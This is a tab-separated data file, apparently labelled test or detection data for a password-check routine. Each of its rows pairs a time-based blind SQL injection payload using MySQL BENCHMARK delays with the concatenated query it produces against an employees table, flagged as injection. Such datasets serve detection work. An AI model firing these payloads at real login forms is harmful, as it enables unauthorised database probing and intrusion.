SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (3311=3311	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (3311=3311';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345)) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((5521=5521	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345)) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((5521=5521';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (((1710=1710	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (((1710=1710';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345 AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345 AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ('ObPe'='ObPe	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ('ObPe'='ObPe';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (('hlcg'='hlcg	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (('hlcg'='hlcg';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((('yghh'='yghh	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((('yghh'='yghh';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND 'MGFJ'='MGFJ	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND 'MGFJ'='MGFJ';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ('ZnJZ' LIKE 'ZnJZ	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ('ZnJZ' LIKE 'ZnJZ';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (('IDjN' LIKE 'IDjN	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (('IDjN' LIKE 'IDjN';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((('Ogpr' LIKE 'Ogpr	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((('Ogpr' LIKE 'Ogpr';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND 'QRjY' LIKE 'QRjY	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND 'QRjY' LIKE 'QRjY';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ("WJNG"="WJNG	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ("WJNG"="WJNG';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (("sLZo"="sLZo	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (("sLZo"="sLZo';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((("juCu"="juCu	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((("juCu"="juCu';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND "RiUa"="RiUa	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND "RiUa"="RiUa';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ("iFkY" LIKE "iFkY	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ("iFkY" LIKE "iFkY';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (("nmUC" LIKE "nmUC	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND (("nmUC" LIKE "nmUC';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((("kmpp" LIKE "kmpp	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND ((("kmpp" LIKE "kmpp';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND "vtFR" LIKE "vtFR	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 7509=BENCHMARK(5000000,MD5(CHAR(78,78,97,116))) AND "vtFR" LIKE "vtFR';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (9595=9595	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (9595=9595';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345)) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ((3460=3460	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345)) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ((3460=3460';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345))) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (((3874=3874	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345))) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (((3874=3874';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345 AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345 AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ('GiFx'='GiFx	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ('GiFx'='GiFx';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (('Nijy'='Nijy	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (('Nijy'='Nijy';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ((('FNnY'='FNnY	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ((('FNnY'='FNnY';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND 'HhTg'='HhTg	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND 'HhTg'='HhTg';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ('dJtm' LIKE 'dJtm	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ('dJtm' LIKE 'dJtm';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (('gwln' LIKE 'gwln	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (('gwln' LIKE 'gwln';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ((('Epqi' LIKE 'Epqi	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ((('Epqi' LIKE 'Epqi';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND 'CyDM' LIKE 'CyDM	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND 'CyDM' LIKE 'CyDM';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ("wQSc"="wQSc	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ("wQSc"="wQSc';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (("sUDY"="sUDY	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND (("sUDY"="sUDY';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ((("vHQA"="vHQA	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND ((("vHQA"="vHQA';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND "gyOt"="gyOt	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 8704=BENCHMARK(5000000,MD5(CHAR(111,100,103,80)))--  AND "gyOt"="gyOt';	sqlInjection--KEY_VALUE_SEPARATOR--true
